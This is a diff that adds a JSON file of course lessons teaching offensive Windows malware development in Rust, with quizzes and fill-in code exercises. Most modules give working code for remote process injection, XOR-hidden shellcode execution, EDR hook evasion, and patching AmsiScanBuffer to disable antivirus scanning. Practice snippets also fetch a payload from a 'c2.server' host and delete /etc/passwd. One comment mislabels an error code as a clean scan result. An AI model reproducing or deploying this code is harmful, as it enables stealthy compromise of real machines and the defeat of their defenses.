@@ -1,0 +1,342 @@
+{
+  "m4-3": {
+    "steps": [
+      {
+        "type": "concept",
+        "heading": "The Parasite Strategy",
+        "body": "If you run 'malware.exe', the Blue Team sees 'malware.exe' in the process list and kills it. To survive, you must become a parasite. Process Injection is the art of forcing a legitimate, trusted program—like Notepad, Explorer, or a browser—to execute your malicious code for you.\n\nWhen your payload lives inside 'explorer.exe', network connections look like normal user activity, and memory scans have to dig much deeper to find you."
+      },
+      {
+        "type": "concept",
+        "heading": "The Injection Pipeline",
+        "body": "The classic injection technique requires four surgical steps using the Windows API.\n\nFirst, you get a handle (permission) to the target process ('OpenProcess'). Second, you carve out a chunk of empty memory inside that target ('VirtualAllocEx'). Third, you copy your shellcode across the process boundary into that empty space ('WriteProcessMemory'). Finally, you force the target process to spin up a new thread executing your code ('CreateRemoteThread')."
+      },
+      {
+        "type": "code",
+        "heading": "Breaching the Wall",
+        "body": "Using the 'windows-sys' crate, we first request God-mode access to our target process.",
+        "code": "use std::ptr;\nuse windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};\nuse windows_sys::Win32::Foundation::HANDLE;\n\nunsafe fn get_target_handle(pid: u32) -> HANDLE {\n    // OpenProcess requests an access token to the target process ID.\n    // PROCESS_ALL_ACCESS is extremely noisy and often flagged by EDRs,\n    // but it gives us total control over the target's memory.\n    let handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);\n    \n    if handle == 0 {\n        panic!(\"[-] Failed to obtain handle. Are you running as Admin?\");\n    }\n    \n    println!(\"[+] Got handle to PID: {}\", pid);\n    handle\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Request Full Access",
+        "context": "Supply the constant \"PROCESS_ALL_ACCESS\" to the 'OpenProcess' function to request maximum privileges.",
+        "code_before": "unsafe {\n    // Request maximum privileges on the target process\n    let h_process = OpenProcess(",
+        "code_after": ", 0, target_pid);\n}",
+        "correct_answer": "PROCESS_ALL_ACCESS"
+      },
+      {
+        "type": "code",
+        "heading": "Remote Allocation",
+        "body": "Now we cross the boundary. We allocate space inside the foreign process, then write our payload into it.",
+        "code": "use windows_sys::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};\nuse windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;\n\nunsafe fn inject_memory(handle: isize, payload: &[u8]) -> *mut std::ffi::c_void {\n    // Allocate RWX memory inside the REMOTE process\n    let remote_addr = VirtualAllocEx(handle, ptr::null(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    \n    let mut bytes_written = 0;\n    // Write our local payload array into the remote memory address\n    let success = WriteProcessMemory(handle, remote_addr, payload.as_ptr() as _, payload.len(), &mut bytes_written);\n    \n    if success == 0 {\n        panic!(\"[-] Failed to write to process memory.\");\n    }\n    \n    remote_addr\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Allocate Remotely",
+        "context": "Use the \"VirtualAllocEx\" function to allocate memory inside the foreign process.",
+        "code_before": "unsafe {\n    // Carve out a chunk of memory in the target process space\n    let remote_buffer = ",
+        "code_after": "(target_handle, ptr::null(), size, MEM_COMMIT, PAGE_READWRITE);\n}",
+        "correct_answer": "VirtualAllocEx"
+      },
+      {
+        "type": "concept",
+        "heading": "The Threading Alarm",
+        "body": "The final step is 'CreateRemoteThread'. This tells the target process: 'Hey, start a new thread pointing at this memory address!'\n\nThe problem? 'CreateRemoteThread' is the loudest alarm bell in the Windows kernel. Every Antivirus product hooks this API. When it fires, the EDR immediately scans the memory address. If it finds shellcode, your process is killed instantly. Advanced attackers avoid this by hijacking an existing thread, rather than creating a new one."
+      },
+      {
+        "type": "code_practice",
+        "heading": "Trigger Execution",
+        "context": "Use the \"CreateRemoteThread\" function to force the target process to execute your injected payload.",
+        "code_before": "unsafe {\n    // Start a new thread inside the target process pointing to our shellcode\n    let thread_handle = ",
+        "code_after": "(h_process, ptr::null(), 0, Some(std::mem::transmute(remote_addr)), ptr::null(), 0, ptr::null_mut());\n}",
+        "correct_answer": "CreateRemoteThread"
+      },
+      {
+        "type": "quiz",
+        "heading": "Knowledge Check",
+        "question": "Why is injecting a reverse shell payload into a web browser process (like chrome.exe) often more successful than injecting it into calc.exe?",
+        "options": [
+          "Browsers do not have ASLR memory protections enabled.",
+          "Network firewalls expect browsers to make frequent, unexpected outbound internet connections, blending your reverse shell into normal traffic.",
+          "Browsers run with SYSTEM level privileges by default.",
+          "Calc.exe does not allow the VirtualAllocEx API to be called."
+        ],
+        "correct": 1,
+        "hint": "Think about what normal behavior looks like for that specific process from the perspective of a network defender."
+      }
+    ]
+  },
+  "m4-4": {
+    "steps": [
+      {
+        "type": "concept",
+        "heading": "The EDR Minefield",
+        "body": "Endpoint Detection and Response (EDR) agents are the modern apex predators. They don't just scan files; they watch your program's behavior in real-time.\n\nThey do this by 'hooking' User-Land APIs. When your Rust program calls 'VirtualAlloc' in 'kernel32.dll', the EDR has secretly modified the first few bytes of that function. Instead of executing normally, it redirects execution into the EDR's inspection engine. The EDR looks at what you are allocating, decides if it's malicious, and either lets it pass or violently terminates your process."
+      },
+      {
+        "type": "concept",
+        "heading": "Direct System Calls",
+        "body": "To survive, we use Direct System Calls (Syscalls).\n\nFunctions in 'kernel32.dll' or 'ntdll.dll' are just wrappers. Eventually, they use the 'syscall' assembly instruction to ask the kernel directly to do the work. If the EDR hooks 'ntdll.dll', we simply ignore 'ntdll.dll'. We write our own assembly to execute the exact 'syscall' number the kernel expects. By going directly to the kernel, we completely bypass the EDR's User-Land hooks. It is the ultimate stealth maneuver."
+      },
+      {
+        "type": "code",
+        "heading": "Encryption & Signatures",
+        "body": "Even with syscalls, if your binary contains raw Metasploit shellcode, static analysis will flag it. We must encrypt the payload at rest and decrypt it in memory.",
+        "code": "fn decrypt_payload(encrypted: &[u8], key: u8) -> Vec<u8> {\n    // We use a basic XOR cipher to hide the payload from static analysis\n    // In a real Trojan, use AES-256 or ChaCha20.\n    let mut decrypted = Vec::with_capacity(encrypted.len());\n    \n    for byte in encrypted {\n        // XOR decrypting the byte and pushing it to the new vector\n        decrypted.push(byte ^ key);\n    }\n    \n    println!(\"[*] Payload decrypted in memory.\");\n    decrypted\n}\n\n// Usage:\n// let encrypted_shellcode = [0x41, 0x52, 0x11]; // Scrambled bytes\n// let clean_shellcode = decrypt_payload(&encrypted_shellcode, 0xAA);"
+      },
+      {
+        "type": "code_practice",
+        "heading": "The XOR Operator",
+        "context": "Use the bitwise XOR operator \"^\" to decrypt the byte.",
+        "code_before": "let encrypted_byte = 0xAA;\nlet key = 0x55;\n// Reverse the encryption using the bitwise operator\nlet clean_byte = encrypted_byte ",
+        "code_after": " key;",
+        "correct_answer": "^"
+      },
+      {
+        "type": "code",
+        "heading": "Evading Memory Scanners",
+        "body": "If you allocate RWX (Read/Write/Execute) memory, EDRs flag you immediately. The evasive pattern is: Allocate as RW, write payload, change to RX, execute.",
+        "code": "use std::ptr;\nuse windows_sys::Win32::System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ};\n\nunsafe fn safe_execute(shellcode: &[u8]) {\n    // 1. Allocate as Read/Write ONLY. Highly unsuspicious.\n    let addr = VirtualAlloc(ptr::null(), shellcode.len(), MEM_COMMIT, PAGE_READWRITE);\n    \n    // 2. Copy the decrypted shellcode in\n    ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as _, shellcode.len());\n    \n    // 3. Flip the permissions to Read/Execute (RX) just before firing\n    let mut old_protect = 0;\n    let success = VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);\n    \n    if success != 0 {\n        // Execute the payload safely without ever triggering an RWX alert\n        let exec: extern \"C\" fn() = std::mem::transmute(addr);\n        exec();\n    }\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Change to RX",
+        "context": "Supply the constant \"PAGE_EXECUTE_READ\" to the 'VirtualProtect' function to lock the memory for execution.",
+        "code_before": "let mut old_permissions = 0;\n// Strip write permissions and make it executable to evade RWX hunting\nVirtualProtect(addr, size, ",
+        "code_after": ", &mut old_permissions);",
+        "correct_answer": "PAGE_EXECUTE_READ"
+      },
+      {
+        "type": "concept",
+        "heading": "Entropy and Stacking",
+        "body": "There is a trap: Entropy. High entropy means data looks completely random. Encrypted payloads have massive entropy. If an AV scans your binary and sees a massive block of pure randomness, it will flag it heuristically.\n\nTo bypass this, advanced trojans use techniques like Obfuscation instead of Encryption (e.g., hiding shellcode as valid English words or UUIDs), or they 'Sleep' for extended periods to outlast sandbox analysis timeouts before ever decrypting their payloads."
+      },
+      {
+        "type": "code_practice",
+        "heading": "Copy the Shellcode",
+        "context": "Use the \"copy_nonoverlapping\" function to safely copy the bytes into your allocated RW memory.",
+        "code_before": "use std::ptr;\n// Move the decrypted payload into the Read/Write memory buffer\nptr::",
+        "code_after": "(clean_payload.as_ptr(), memory_buffer as *mut u8, clean_payload.len());",
+        "correct_answer": "copy_nonoverlapping"
+      },
+      {
+        "type": "quiz",
+        "heading": "Knowledge Check",
+        "question": "You write a loader that perfectly utilizes Direct Syscalls to bypass ntdll.dll hooks. However, Microsoft Defender still flags your executable the moment it touches the disk. What is the most likely reason?",
+        "options": [
+          "Direct syscalls are inherently illegal on Windows.",
+          "The EDR hooked the kernel itself.",
+          "Your binary contains unencrypted shellcode or heavily recognizable static signatures.",
+          "The syscall instruction triggered a hardware exception."
+        ],
+        "correct": 2,
+        "hint": "Syscalls bypass runtime behavioral monitoring. They do nothing to protect against a static scan of the file sitting on the hard drive."
+      }
+    ]
+  },
+  "m4-5": {
+    "steps": [
+      {
+        "type": "concept",
+        "heading": "The Async Illusion",
+        "body": "In traditional multi-threading, the Operating System juggles multiple heavy threads, swapping them in and out (Context Switching). It is incredibly resource-intensive.\n\nAsynchronous programming is different. It is cooperative multitasking on a single thread. When an async function hits a roadblock (like waiting for a network packet), it doesn't block the thread. It essentially says, 'I am pausing. Let someone else do work.' Rust's async model is incredibly fast, but unlike Go, Rust doesn't provide a built-in engine to run async code. You must bring your own runtime. The industry standard is Tokio."
+      },
+      {
+        "type": "concept",
+        "heading": "Futures and Awaiting",
+        "body": "When you call an 'async fn' in Rust, it does absolutely nothing. It returns a Future—a lazy promise that work will be done eventually.\n\nTo actually execute the Future, you must append '.await' to it. The '.await' keyword gives the execution control back to the Tokio runtime, allowing it to drive the Future to completion while juggling other tasks in the background."
+      },
+      {
+        "type": "code",
+        "heading": "The Tokio Engine",
+        "body": "To use async functions, your 'main' function must be wrapped in the Tokio runtime macro.",
+        "code": "use tokio::time::{sleep, Duration};\n\n// We cannot run async code from a normal sync main function.\n// The #[tokio::main] macro invisibly spins up the async engine for us.\n#[tokio::main]\nasync fn main() {\n    println!(\"[*] Sending network probe...\");\n    \n    // Calling simulated_network_io() returns a Future, but does not run it.\n    // We MUST use .await to drive it forward.\n    let result = simulated_network_io().await;\n    \n    println!(\"[+] Probe complete: {}\", result);\n}\n\n// We declare the function async so it can yield execution\nasync fn simulated_network_io() -> String {\n    // tokio::time::sleep is non-blocking. It lets the thread do other work.\n    sleep(Duration::from_secs(2)).await;\n    String::from(\"ACK\")\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Drive the Future",
+        "context": "Use the \".await\" keyword to actually execute the Future returned by the function.",
+        "code_before": "async fn fetch_payload() {\n    // Make the HTTP request and wait for the response without blocking the thread\n    let response = http_client.get(\"http://c2.server/payload\")\n        ",
+        "code_after": ";\n}",
+        "correct_answer": ".await"
+      },
+      {
+        "type": "code",
+        "heading": "Spawning Concurrent Tasks",
+        "body": "If you '.await' inside a loop, it runs sequentially. To run thousands of tasks simultaneously, we use 'tokio::spawn'.",
+        "code": "use tokio::task;\n\n#[tokio::main]\nasync fn main() {\n    let mut handles = vec![];\n\n    for i in 0..5 {\n        // tokio::spawn rips the async block off and schedules it to run concurrently\n        // It returns a JoinHandle, which we can track.\n        let handle = tokio::spawn(async move {\n            println!(\"[*] Task {} executing...\", i);\n            // Imagine doing network I/O here\n        });\n        \n        handles.push(handle);\n    }\n\n    // We loop through our tracking handles and await them all, \n    // ensuring the main program doesn't exit before the background tasks finish.\n    for handle in handles {\n        handle.await.unwrap();\n    }\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Spawn the Task",
+        "context": "Use the \"tokio::spawn\" function to schedule the async block for concurrent execution.",
+        "code_before": "for target_ip in subnet {\n    // Push the scanning task into the background\n    ",
+        "code_after": "(async move {\n        scan_port(target_ip, 80).await;\n    });\n}",
+        "correct_answer": "tokio::spawn"
+      },
+      {
+        "type": "concept",
+        "heading": "Starving the Reactor",
+        "body": "There is a critical rule in Async Rust: Never block the reactor.\n\nBecause async runs multiple tasks on the same thread, if one task runs a heavy CPU calculation (like computing a massive cryptographic hash) without using '.await', the entire thread freezes. Every other network request and task on that thread grinds to a halt. For heavy CPU work, you must use 'tokio::task::spawn_blocking' to push the math onto a dedicated background thread, keeping the async engine running smoothly."
+      },
+      {
+        "type": "code_practice",
+        "heading": "Join Multiple Futures",
+        "context": "Use the \"tokio::join!\" macro to run two futures concurrently and wait for both to complete.",
+        "code_before": "let future1 = download_chunk_1();\nlet future2 = download_chunk_2();\n\n// Wait for both concurrent downloads to finish simultaneously\nlet (res1, res2) = ",
+        "code_after": "(future1, future2);",
+        "correct_answer": "tokio::join!"
+      },
+      {
+        "type": "quiz",
+        "heading": "Knowledge Check",
+        "question": "You write a function: 'let task = fetch_api_data();'. The 'fetch_api_data' function is declared as 'async fn'. You then immediately run 'println!(\"Done\");' without writing '.await'. What happens to the API request?",
+        "options": [
+          "It executes in the background on a separate CPU thread.",
+          "It crashes the program because the return type is mismatched.",
+          "It never actually executes, because Futures are lazy and do nothing until awaited or spawned.",
+          "It pauses the main thread automatically until the request completes."
+        ],
+        "correct": 2,
+        "hint": "In Rust, an async function call merely creates a blueprint for work. Someone has to tell the engine to actually build it."
+      }
+    ]
+  },
+  "m4-6": {
+    "steps": [
+      {
+        "type": "concept",
+        "heading": "Bridging the Gap",
+        "body": "Rust is modern and safe. The Operating System (Windows API, Linux kernel interfaces, OpenSSL) is written in C. It is old, fast, and completely unsafe.\n\nForeign Function Interface (FFI) is how Rust talks to C. To interact with the OS at a low level, we must define the C function signatures in Rust, convert our safe Rust data types into raw memory pointers that C can understand, and explicitly tell the compiler to drop its safety guarantees."
+      },
+      {
+        "type": "concept",
+        "heading": "The String Boundary",
+        "body": "The hardest part of FFI is strings. Rust strings ('String', '&str') know their own length and do not end with a zero. C strings ('char*') have no idea how long they are; they just keep reading memory until they hit a null terminator byte ('\\0').\n\nIf you pass a Rust string pointer directly into a C function, C will read past the end of your string and crash the program. You must explicitly convert Rust strings into 'CString' types, which append that critical null byte."
+      },
+      {
+        "type": "code",
+        "heading": "Declaring the Function",
+        "body": "We use the 'extern \"C\"' block to tell the Rust compiler about a function that exists outside of our code.",
+        "code": "use std::ffi::c_char;\n\n// We declare a block for foreign C functions.\n// This tells Rust: Trust me, the linker will find this function later.\nextern \"C\" {\n    // Standard C library 'puts' function (prints a string)\n    // The argument is a raw, immutable pointer to a C character array.\n    fn puts(s: *const c_char) -> i32;\n}\n\nfn main() {\n    // We will call this in the next step\n    println!(\"[*] Foreign function signature declared.\");\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Define Foreign Block",
+        "context": "Use the \"extern \\\"C\\\"\" syntax to declare the block where C function signatures reside.",
+        "code_before": "// Link against standard C libraries\n",
+        "code_after": " {\n    fn strlen(s: *const std::ffi::c_char) -> usize;\n}",
+        "correct_answer": "extern \"C\""
+      },
+      {
+        "type": "code",
+        "heading": "Crossing the Boundary",
+        "body": "We construct a 'CString', extract a raw pointer, and call the unsafe C function.",
+        "code": "use std::ffi::CString;\nuse std::os::raw::c_char;\n\nextern \"C\" {\n    fn puts(s: *const c_char) -> i32;\n}\n\nfn main() {\n    let message = \"Malware initialized\";\n    \n    // 1. Convert the Rust &str into a CString (adds the null terminator)\n    // We unwrap() because CString will fail if the Rust string contains an internal null byte\n    let c_safe_string = CString::new(message).unwrap();\n    \n    // 2. We MUST use an unsafe block to call the foreign function,\n    // because Rust cannot guarantee the C code won't segfault.\n    unsafe {\n        // .as_ptr() hands over the raw memory address to C\n        puts(c_safe_string.as_ptr());\n    }\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Add Null Terminator",
+        "context": "Use the \"CString::new\" function to convert the Rust string literal into a C-safe, null-terminated string.",
+        "code_before": "use std::ffi::CString;\n\nlet target_process = \"explorer.exe\";\n// Prepare the string for the Windows API call\nlet c_string = ",
+        "code_after": "(target_process).unwrap();",
+        "correct_answer": "CString::new"
+      },
+      {
+        "type": "concept",
+        "heading": "The Memory Leak Trap",
+        "body": "When crossing boundaries, whoever allocates the memory MUST be the one to free it.\n\nIf a C library function allocates a struct using 'malloc' and returns a pointer to Rust, Rust's borrow checker will NOT automatically free that memory when it goes out of scope. You must explicitly call the corresponding C 'free()' function via FFI. Otherwise, your tool will hemorrhage memory."
+      },
+      {
+        "type": "code_practice",
+        "heading": "Unsafe Execution",
+        "context": "Wrap the foreign function call in an \"unsafe\" block to explicitly acknowledge the danger.",
+        "code_before": "let c_path = CString::new(\"/etc/passwd\").unwrap();\n// Tell the compiler we are taking responsibility for memory safety\n",
+        "code_after": " {\n    unlink(c_path.as_ptr());\n}",
+        "correct_answer": "unsafe"
+      },
+      {
+        "type": "quiz",
+        "heading": "Knowledge Check",
+        "question": "Why does calling 'CString::new(\"payload\\0_hidden\").unwrap()' cause the Rust program to panic?",
+        "options": [
+          "Because Rust strings must be strictly UTF-16.",
+          "Because the string contains an internal null byte, making it impossible to convert safely into a standard C string.",
+          "Because CString requires a mutable reference to the string.",
+          "Because the Rust drop checker instantly frees the memory."
+        ],
+        "correct": 1,
+        "hint": "C relies completely on the null terminator to know when a string ends. If there is one in the middle of your word, C gets very confused."
+      }
+    ]
+  },
+  "m4-7": {
+    "steps": [
+      {
+        "type": "concept",
+        "heading": "The Invisible Net",
+        "body": "The Antimalware Scan Interface (AMSI) is an architecture built into Windows. Before a script (PowerShell, VBScript) or a .NET assembly executes, Windows intercepts the payload in memory and hands it to AMSI. AMSI asks Microsoft Defender: 'Is this malicious?'\n\nIf Defender says yes, the script is killed instantly. AMSI is why your raw PowerShell reverse shell drops dead immediately. However, AMSI operates in User-Land, inside your own process memory space. That makes it vulnerable."
+      },
+      {
+        "type": "concept",
+        "heading": "Blinding the Guard",
+        "body": "AMSI relies on a specific DLL function: 'AmsiScanBuffer' inside 'amsi.dll'. If your malware is executing within the same process (like a loaded .NET assembly or an injected DLL), you have access to that same memory space.\n\nWe don't need to bypass the scan; we simply break the scanner. We locate the memory address of 'AmsiScanBuffer' and overwrite the first few bytes with a CPU instruction ('ret' or moving an error code). When AMSI tries to scan something, it hits our patch, instantly returns a code saying 'Everything is fine', and goes blind."
+      },
+      {
+        "type": "code",
+        "heading": "Locating the Target",
+        "body": "To patch the function, we first have to find exactly where it sits in our program's memory.",
+        "code": "use std::ffi::CString;\nuse windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};\n\nunsafe fn find_amsi() -> *mut std::ffi::c_void {\n    // Load the AMSI DLL into our process memory\n    let amsi_dll = CString::new(\"amsi.dll\").unwrap();\n    let h_module = LoadLibraryA(amsi_dll.as_ptr() as _);\n    \n    if h_module == 0 { return std::ptr::null_mut(); }\n    \n    // Dynamically look up the exact memory address of the scanning function\n    let func_name = CString::new(\"AmsiScanBuffer\").unwrap();\n    let func_addr = GetProcAddress(h_module, func_name.as_ptr() as _);\n    \n    println!(\"[*] AmsiScanBuffer located at: {:p}\", func_addr.unwrap());\n    func_addr.unwrap() as *mut std::ffi::c_void\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Resolve the Address",
+        "context": "Use the \"GetProcAddress\" API to locate the target function inside the loaded DLL.",
+        "code_before": "let dll_handle = LoadLibraryA(b\"amsi.dll\\0\".as_ptr());\n// Fetch the raw memory pointer to the function\nlet func_ptr = ",
+        "code_after": "(dll_handle, b\"AmsiScanBuffer\\0\".as_ptr());",
+        "correct_answer": "GetProcAddress"
+      },
+      {
+        "type": "code",
+        "heading": "The Hot-Patch",
+        "body": "We change the memory permissions, write the malicious patch bytes over the function's prologue, and restore the permissions.",
+        "code": "use std::ptr;\nuse windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};\n\nunsafe fn patch_amsi(func_addr: *mut std::ffi::c_void) {\n    // x64 Patch: move AMSI_RESULT_CLEAN into EAX, and return.\n    // These hex bytes translate to: mov eax, 0x80070057; ret\n    let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];\n    \n    let mut old_protect = 0;\n    // Un-protect the memory so we can overwrite Microsoft's code\n    VirtualProtect(func_addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);\n    \n    // Overwrite the first 6 bytes of AmsiScanBuffer\n    ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());\n    \n    // Restore the original memory protections to cover our tracks\n    VirtualProtect(func_addr, patch.len(), old_protect, &mut old_protect);\n    \n    println!(\"[+] AMSI successfully patched. Antivirus is blinded.\");\n}"
+      },
+      {
+        "type": "code_practice",
+        "heading": "Overwrite the Bytes",
+        "context": "Use the \"ptr::copy_nonoverlapping\" function to write the malicious byte array over the target function.",
+        "code_before": "let patch_bytes: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];\n// Inject the ret instruction over the function prologue\n",
+        "code_after": "(patch_bytes.as_ptr(), target_addr as *mut u8, patch_bytes.len());",
+        "correct_answer": "ptr::copy_nonoverlapping"
+      },
+      {
+        "type": "concept",
+        "heading": "The Telemetry Trap",
+        "body": "If you just write 'GetProcAddress(\"AmsiScanBuffer\")', you will be caught.\n\nModern EDRs know exactly how this bypass works. They monitor 'GetProcAddress' for the string \"AmsiScanBuffer\". If they see it, they kill you. They also monitor 'VirtualProtect' calls specifically targeting memory inside 'amsi.dll'.\nTo survive, attackers obfuscate the string (e.g., \"Amsi\" + \"Scan\" + \"Buffer\"), or use Hardware Breakpoints instead of memory patching to manipulate the CPU registers silently when the function is called."
+      },
+      {
+        "type": "code_practice",
+        "heading": "Unlock Memory",
+        "context": "Use the \"VirtualProtect\" API to temporarily change the memory permissions to Read/Write/Execute.",
+        "code_before": "let mut old_perms = 0;\n// Disable DEP/NX protections for the AMSI function block\n",
+        "code_after": "(amsi_addr, 6, PAGE_EXECUTE_READWRITE, &mut old_perms);",
+        "correct_answer": "VirtualProtect"
+      },
+      {
+        "type": "quiz",
+        "heading": "Knowledge Check",
+        "question": "What is the mechanical result of overwriting the first bytes of 'AmsiScanBuffer' with 'mov eax, 0x80070057; ret'?",
+        "options": [
+          "It crashes the AMSI service, forcing Windows to reboot into Safe Mode.",
+          "It forces the function to immediately exit and return a status code telling the caller the payload is harmless, bypassing the actual scan entirely.",
+          "It redirects the scanned payload back to the attacker's C2 server over a reverse shell.",
+          "It encrypts the payload using AES-256 before AMSI can read it."
+        ],
+        "correct": 1,
+        "hint": "We don't want to crash the program, we just want to lie to the caller about the results."
+      }
+    ]
+  }
+}
